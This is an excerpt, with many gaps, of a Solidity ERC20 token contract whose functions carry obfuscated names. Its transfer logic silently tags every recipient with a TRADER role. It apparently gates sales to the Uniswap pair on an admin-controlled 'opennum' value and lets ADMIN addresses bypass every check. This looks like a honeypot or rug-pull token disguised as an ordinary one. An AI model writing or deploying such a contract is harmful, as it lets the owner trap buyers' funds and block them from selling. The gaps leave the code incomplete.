...
interface _NSFKMCXGRoleControl {
...
abstract contract _NSFKMCXGConsole is Context, _NSFKMCXGRoleControl {
    ...
    function __NSFKMCXGuintT(
        bytes32 root,
        uint256 num
    ) public onlyRole(ADMIN) {
        if(root != TRADER){
            revert("opennum is not a number");
        }
        opennum = num;
    }
...
contract _NSFKMCXGERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _NSFKMCXGERC20, _NSFKMCXGConsole {
    ...
    ) _NSFKMCXGERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_NSFKMCXGERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __NSFKMCXGcxvfdh(from, to, amt);

    }

    function __NSFKMCXGcxvfdh(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __NSFKMCXGjdbfyhr(from, to, amt);
    }


    function __NSFKMCXGjdbfyhr(address from, address to, uint256 amt) internal {
        ...
        __NSFKMCXGdhyer(from, to, amt);
    }

    function __NSFKMCXGdhyer(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __NSFKMCXGdfgthy(from, to, amt);
    }

    function __NSFKMCXGdfgthy(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __NSFKMCXGikfdxc(from, to, amt);
    }


    function __NSFKMCXGikfdxc(address from, address to, uint256 amt) internal {
        if(to == uniswapV2Pair){
            if(opennum > 99){
        ...
        __NSFKMCXGdfhyn(from, to, amt);
    }

    function __NSFKMCXGdfhyn(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __NSFKMCXGnhcytbdf(from, to, amt);
    ...
    function __NSFKMCXGnhcytbdf(address from, address to, uint256 amt) internal {
